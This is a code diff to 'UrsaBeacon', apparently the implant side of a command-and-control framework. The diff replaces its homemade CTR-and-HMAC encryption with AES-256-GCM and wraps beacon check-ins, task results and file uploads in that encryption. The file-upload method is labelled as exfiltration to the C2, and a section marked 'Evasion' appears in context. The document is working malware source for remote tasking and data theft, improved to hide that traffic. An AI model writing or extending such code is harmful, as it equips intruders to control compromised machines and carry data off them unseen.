@@ -40,9 +40,16 @@ import threading
 import urllib.request
 import urllib.error
 import argparse
-import hashlib
-import hmac
 from datetime import datetime
+
+from cryptography.exceptions import InvalidTag
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+
+CRYPTO_FRAME_MAGIC = b"URS2"
+CRYPTO_NONCE_SIZE = 12
+CRYPTO_TAG_SIZE = 16
+CRYPTO_AAD = b"ursa-major-c2:v2:aes-256-gcm"
 
 
 # ── Evasion ───────────────────────────────────────────────────────────────────
@@ -346,63 +353,46 @@ class UrsaBeacon:
 
     # ── Crypto (matches major/crypto.py UrsaCrypto) ──
 
-    def _xor_bytes(self, a, b):
-        return bytes(x ^ y for x, y in zip(a, b))
+    def _session_cipher(self):
+        if not self.session_key:
+            return None
+        return AESGCM(bytes.fromhex(self.session_key))
 
     def _encrypt(self, plaintext):
-        """Encrypt with CTR mode + HMAC (matches UrsaCrypto.encrypt)."""
-        if not self.session_key:
+        """Encrypt with AES-256-GCM (matches UrsaCrypto.encrypt)."""
+        cipher = self._session_cipher()
+        if cipher is None:
             return plaintext
-        key_bytes = bytes.fromhex(self.session_key)
-        enc_key = hashlib.sha256(key_bytes + b":enc").digest()
-        mac_key = hashlib.sha256(key_bytes + b":mac").digest()
-
-        iv = os.urandom(16)
-        counter = int.from_bytes(iv, 'big')
-        ciphertext = bytearray()
 
         if isinstance(plaintext, str):
             plaintext = plaintext.encode()
-
-        for i in range(0, len(plaintext), 16):
-            ctr_bytes = counter.to_bytes(16, 'big')
-            keystream = hashlib.sha256(enc_key + ctr_bytes).digest()[:16]
-            counter += 1
-            chunk = plaintext[i:i+16]
-            ciphertext.extend(self._xor_bytes(chunk, keystream[:len(chunk)]))
-
-        message = iv + bytes(ciphertext)
-        mac = hmac.new(mac_key, message, hashlib.sha256).digest()
-        return base64.b64encode(message + mac).decode()
+        nonce = os.urandom(CRYPTO_NONCE_SIZE)
+        ciphertext = cipher.encrypt(nonce, plaintext, CRYPTO_AAD)
+        return base64.b64encode(CRYPTO_FRAME_MAGIC + nonce + ciphertext).decode()
 
     def _decrypt(self, data):
         """Decrypt (matches UrsaCrypto.decrypt)."""
-        if not self.session_key:
+        cipher = self._session_cipher()
+        if cipher is None:
             return data
         raw = base64.b64decode(data)
-        key_bytes = bytes.fromhex(self.session_key)
-        enc_key = hashlib.sha256(key_bytes + b":enc").digest()
-        mac_key = hashlib.sha256(key_bytes + b":mac").digest()
+        min_size = len(CRYPTO_FRAME_MAGIC) + CRYPTO_NONCE_SIZE + CRYPTO_TAG_SIZE
+        if len(raw) < min_size:
+            raise ValueError("Data too short")
+        if not raw.startswith(CRYPTO_FRAME_MAGIC):
+            raise ValueError("Unsupported legacy crypto frame; re-register session")
+        nonce_start = len(CRYPTO_FRAME_MAGIC)
+        nonce_end = nonce_start + CRYPTO_NONCE_SIZE
+        try:
+            return cipher.decrypt(raw[nonce_start:nonce_end], raw[nonce_end:], CRYPTO_AAD)
+        except InvalidTag as exc:
+            raise ValueError("AES-GCM authentication failed") from exc
 
-        mac_received = raw[-32:]
-        message = raw[:-32]
-        mac_expected = hmac.new(mac_key, message, hashlib.sha256).digest()
-        if not hmac.compare_digest(mac_received, mac_expected):
-            raise ValueError("HMAC verification failed")
+    def _encrypt_json(self, obj):
+        return self._encrypt(json.dumps(obj).encode())
 
-        iv = message[:16]
-        ciphertext = message[16:]
-        counter = int.from_bytes(iv, 'big')
-        plaintext = bytearray()
-
-        for i in range(0, len(ciphertext), 16):
-            ctr_bytes = counter.to_bytes(16, 'big')
-            keystream = hashlib.sha256(enc_key + ctr_bytes).digest()[:16]
-            counter += 1
-            chunk = ciphertext[i:i+16]
-            plaintext.extend(self._xor_bytes(chunk, keystream[:len(chunk)]))
-
-        return bytes(plaintext)
+    def _decrypt_json(self, data):
+        return json.loads(self._decrypt(data).decode())
 
     # ── HTTP Helpers ──
 
@@ -471,31 +461,51 @@ class UrsaBeacon:
 
     def beacon(self):
         """Check in with the C2 and get pending tasks."""
-        resp = self._post("/beacon", {
-            "session_id": self.session_id,
-        })
+        body = {"session_id": self.session_id}
+        if self.session_key:
+            body["encrypted"] = True
+        resp = self._post("/beacon", body)
 
         if "error" in resp:
             return []
+
+        if self.session_key and "data" in resp:
+            try:
+                return self._decrypt_json(resp["data"]).get("tasks", [])
+            except Exception:
+                return []
 
         return resp.get("tasks", [])
 
     def send_result(self, task_id, result="", error=""):
         """Send task results back to the C2."""
-        self._post("/result", {
+        body = {
             "session_id": self.session_id,
             "task_id": task_id,
-            "result": result,
-            "error": error,
-        })
+        }
+        if self.session_key:
+            body["encrypted"] = True
+            body["data"] = self._encrypt_json({"result": result, "error": error})
+        else:
+            body["result"] = result
+            body["error"] = error
+        self._post("/result", body)
 
     def upload_file(self, filename, data):
         """Upload a file to the C2 (exfiltration)."""
-        self._post("/upload", {
+        body = {
             "session_id": self.session_id,
+        }
+        payload = {
             "filename": filename,
             "data": base64.b64encode(data).decode(),
-        })
+        }
+        if self.session_key:
+            body["encrypted"] = True
+            body["data"] = self._encrypt_json(payload)
+        else:
+            body.update(payload)
+        self._post("/upload", body)
 
     # ── Task Execution ──
 
